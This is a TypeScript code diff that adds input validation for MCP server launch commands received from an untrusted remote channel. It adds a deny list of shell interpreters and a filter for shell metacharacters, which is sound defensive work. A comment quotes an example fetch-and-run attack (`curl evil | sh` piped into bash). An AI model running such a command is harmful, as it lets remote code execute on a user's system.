@@ -39,6 +39,59 @@ export function isRemoteMcp(e: McpJsonEntry): boolean {
   return typeof e?.url === 'string' && e.url.length > 0;
 }
 
+// Shells / interpreters that make an MCP `command` a direct arbitrary-code
+// primitive (e.g. `bash -c "curl evil | sh"`). Never allow these as the
+// launcher for a remotely-supplied stdio MCP entry.
+const _MCP_FORBIDDEN_COMMANDS = new Set([
+  'bash', 'sh', 'zsh', 'dash', 'ksh', 'csh', 'tcsh', 'fish', 'ash',
+  'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe', 'env',
+]);
+
+/**
+ * Guard for stdio MCP `command` values that arrive from an untrusted channel
+ * (e.g. a WS `mcp_update` frame). Rejects shells/interpreters, absolute or
+ * relative paths, and anything carrying shell metacharacters. This does NOT
+ * make mcp_update safe on its own — that path must also be gated behind an
+ * explicit opt-in (mcpUpdateEnabled) — it just removes the most direct
+ * command-execution primitives. Remote (url) entries are validated separately.
+ */
+export function isSafeStdioMcpCommand(command: unknown): command is string {
+  if (typeof command !== 'string') return false;
+  const cmd = command.trim();
+  if (!cmd) return false;
+  // Must be a bare launcher resolved from PATH — no path separators.
+  if (/[\\/]/.test(cmd)) return false;
+  // No shell metacharacters that could smuggle a second command.
+  if (/[;&|`$(){}<>\n\r*?~!"'\s]/.test(cmd)) return false;
+  if (_MCP_FORBIDDEN_COMMANDS.has(cmd.toLowerCase())) return false;
+  return true;
+}
+
+/**
+ * Filter an untrusted `mcpServers` map down to entries that are safe to write
+ * and (re)spawn. Remote entries must have an http/https url; stdio entries must
+ * pass isSafeStdioMcpCommand. Returns the accepted subset plus the names that
+ * were rejected (for logging). Callers should still gate the whole path behind
+ * an opt-in flag.
+ */
+export function sanitizeRemoteMcpEntries(
+  entries: Record<string, unknown>,
+): { safe: McpJsonEntries; rejected: string[] } {
+  const safe: McpJsonEntries = {};
+  const rejected: string[] = [];
+  for (const [name, raw] of Object.entries(entries || {})) {
+    const e = raw as McpJsonEntry | undefined;
+    if (!e || typeof e !== 'object') { rejected.push(name); continue; }
+    if (isRemoteMcp(e)) {
+      const url = e.url as string;
+      if (/^https?:\/\//i.test(url)) { safe[name] = e; } else { rejected.push(name); }
+      continue;
+    }
+    if (isSafeStdioMcpCommand(e.command)) { safe[name] = e; } else { rejected.push(name); }
+  }
+  return { safe, rejected };
+}
+
 export type McpJsonEntries = Record<string, McpJsonEntry>;
 
 const MCP_FILE = '.mcp.json';
